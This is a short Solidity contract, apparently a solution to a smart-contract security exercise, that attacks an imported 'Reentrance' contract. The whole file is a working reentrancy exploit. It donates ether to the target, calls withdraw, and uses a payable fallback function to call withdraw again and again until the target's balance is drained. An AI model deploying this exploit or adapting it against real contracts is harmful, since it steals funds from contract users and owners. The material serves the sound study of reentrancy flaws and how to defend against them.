// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    // send a little eth to open to comm
    // call withdraw on the failed tx with fallback
    function hackContract() external {
        // Code me!
        address hackAddress = address(this);
        Reentrance(payable(contractAddress)).donate{value: hackAddress.balance}(hackAddress);
        Reentrance(contractAddress).withdraw();
    }

    // call withdraw on the failed tx with fallback
    fallback() external payable {
        if (contractAddress.balance > 0 ) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
